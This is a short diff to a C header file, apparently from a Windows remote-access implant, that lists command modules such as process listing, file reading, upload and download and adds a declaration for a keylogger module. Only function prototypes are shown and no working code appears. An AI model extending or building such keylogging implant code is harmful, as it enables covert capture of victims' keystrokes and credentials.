@@ -429,6 +429,7 @@ void mod_ps(Buffer *out);
 void mod_ls(Buffer *out, const char *path);
 void mod_cd(Buffer *out, const char *path);
 void mod_cat(Buffer *out, const char *path);
+void mod_keylogger(Buffer *out, const char *subcmd);
 void mod_upload(Buffer *out, const char *path, const unsigned char *data, DWORD data_len);
 void mod_download(Buffer *out, const char *path);
 
